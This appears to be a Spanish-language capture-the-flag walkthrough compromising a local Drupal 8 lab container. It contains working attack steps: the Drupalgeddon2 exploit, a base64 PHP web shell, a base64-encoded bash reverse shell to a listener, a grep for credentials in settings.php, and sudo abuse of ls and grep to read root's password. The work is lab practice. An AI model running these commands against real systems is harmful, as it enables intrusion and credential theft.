@@ -1,0 +1,162 @@
+# Enumeracion de Puertos, Servicios y Versiones
+
+nmap -Pn -n -sS -p- -sCV --min-rate 1000 -vvv 172.17.0.2 -oN nmap
+
+Nmap scan report for 172.17.0.2
+Host is up, received arp-response (0.0000020s latency).
+Scanned at 2024-10-16 10:37:41 -03 for 11s
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+| http-robots.txt: 22 disallowed entries 
+| /core/ /profiles/ /README.txt /web.config /admin/ 
+| /comment/reply/ /filter/tips/ /node/add/ /search/ /user/register/ 
+| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
+| /index.php/comment/reply/ /index.php/filter/tips/ /index.php/node/add/ 
+| /index.php/search/ /index.php/user/password/ /index.php/user/register/ 
+|_/index.php/user/login/ /index.php/user/logout/
+|_http-generator: Drupal 8 (https://www.drupal.org)
+|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
+|_http-title: Welcome to Find your own Style | Find your own Style
+| http-methods: 
+|_  Supported Methods: GET POST HEAD OPTIONS
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+chequeo la web y veo que esta realizado en drupal y si detallo el reporte de nmap me indica que
+es Drupal 8, asi que busco en la web y me consigo con el siguiente exploit:
+https://github.com/dreadlocked/Drupalgeddon2
+
+asi que me clono el repositorio
+
+git clone https://github.com/dreadlocked/Drupalgeddon2
+cd Drupalgeddon2/
+sudo gem install highline
+ruby drupalgeddon2.rb http://172.17.0.2
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[i] Target : http://172.17.0.2/
+--------------------------------------------------------------------------------
+[+] Header : v8 [X-Generator]
+[!] MISSING: http://172.17.0.2/CHANGELOG.txt    (HTTP Response: 404)
+[+] Found  : http://172.17.0.2/core/CHANGELOG.txt    (HTTP Response: 200)
+[!] MISSING: http://172.17.0.2/core/CHANGELOG.txt    (HTTP Response: 200)
+[+] Header : v8 [X-Generator]
+[!] MISSING: http://172.17.0.2/includes/bootstrap.inc    (HTTP Response: 404)
+[!] MISSING: http://172.17.0.2/core/includes/bootstrap.inc    (HTTP Response: 403)
+[!] MISSING: http://172.17.0.2/includes/database.inc    (HTTP Response: 404)
+[+] Found  : http://172.17.0.2/    (HTTP Response: 200)
+[+] Metatag: v8.x [Generator]
+[!] MISSING: http://172.17.0.2/    (HTTP Response: 200)
+[+] Drupal?: v8.x
+--------------------------------------------------------------------------------
+[*] Testing: Form   (user/register)
+[+] Result : Form valid
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Clean URLs
+[+] Result : Clean URLs enabled
+--------------------------------------------------------------------------------
+[*] Testing: Code Execution   (Method: mail)
+[i] Payload: echo BTRSJAVJ
+[+] Result : BTRSJAVJ
+[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+--------------------------------------------------------------------------------
+[*] Testing: Existing file   (http://172.17.0.2/shell.php)
+[i] Response: HTTP 404 // Size: 16
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Writing To Web Root   (./)
+[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
+[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
+--------------------------------------------------------------------------------
+[i] Fake PHP shell:   curl 'http://172.17.0.2/shell.php' -d 'c=hostname'
+06dcc1fe3a50>> whoami
+www-data
+06dcc1fe3a50>> 
+
+y ya hemos accedido como el user www-data, ahora me pondre en escucha por netcat y enviare una revershell
+
+=======================+
+desde mi maquina
+nc -nlvp 4444
+=======================+
+
+envio la revershell
+echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNDQ0NCAwPiYxCg==' |base64 -d |bash
+
+=======================+
+ya recibida la conexion en netcat, comienzo la intrucion
+
+script /dev/null -c bash 
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+ls /home
+ballenita
+nada por sudo -l o binarios suid
+nada en los procesos...
+
+buscando por la web:
+en hacktricks >>
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal
+
+nos conseguimos con el siguiente comandos que busca informacion en el archivo settings.php
+
+
+find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
+
+=========================================================================================
+ *   'database' => 'database_under_beta_testing', // Mensaje del sysadmin, no se usar sql y petó la base de datos jiji xd
+ *   'username' => 'ballenita',
+ *   'password' => 'ballenitafeliz', //Cuidadito cuidadín pillin
+ *   'host' => 'localhost',
+ *   'port' => '3306',
+ *   'driver' => 'mysql',
+ *   'prefix' => '',
+ * by using the 'prefix' setting. If a prefix is specified, the table
+ * To have all database names prefixed, set 'prefix' as a string:
+ *   'prefix' => 'main_',
+ * To provide prefixes for specific tables, set 'prefix' as an array.
+ *   'prefix' => array(
+ *   'prefix' => array(
+ *     'driver' => 'pgsql',
+ *     'database' => 'databasename',
+ *     'username' => 'sqlusername',
+ *     'password' => 'sqlpassword',
+ *     'host' => 'localhost',
+ *     'prefix' => '',
+ *     'driver' => 'sqlite',
+ *     'database' => '/path/to/databasefilename',
+  'database' => 'sites/default/files/.ht.sqlite',
+  'prefix' => '',
+  'driver' => 'sqlite',
+==========================================================================================
+
+aqui puedo observar las credenciales del usuario del sistema ballenita
+ballenita:ballenitafeliz
+
+su ballenita
+pass:ballenitafeliz
+
+sudo -l
+User ballenita may run the following commands on 06dcc1fe3a50:
+    (root) NOPASSWD: /bin/ls, /bin/grep
+
+puedo hacer uso de 2 binarios, con el binario /bin/ls, chequeare el directorio de root
+
+sudo /bin/ls /root
+secretitomaximo.txt
+
+ahora con grep, podria leer el archivo de root
+
+sudo /bin/grep '' /root/secretitomaximo.txt
+nobodycanfindthispasswordrootrocks
+
+ahora puedo escalar a root ;)
+
+su root
+pass:nobodycanfindthispasswordrootrocks
+
+#root
